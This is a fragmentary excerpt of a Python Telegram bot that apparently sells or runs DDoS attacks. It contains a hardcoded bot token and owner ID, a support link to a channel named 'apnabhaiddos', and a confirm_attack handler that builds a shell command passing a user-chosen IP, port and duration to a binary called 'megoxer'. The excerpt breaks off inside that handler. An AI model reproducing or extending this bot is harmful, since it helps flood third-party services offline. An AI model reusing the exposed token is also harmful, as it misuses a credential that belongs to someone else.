...
TELEGRAM_TOKEN = '8053115372:AAHsm6DSPjkFmZwgAnehNpyEY0NIdXZOPNc'
OWNER_ID = '6882674372'
...
def help_command(message):
    ...
    markup.add(types.InlineKeyboardButton("📞 Contact Support", url="https://t.me/apnabhaiddos"))
...
def confirm_attack(call):
    try:
        ...
        command = f"./megoxer {ip} {port} {duration} 1300"
        try:
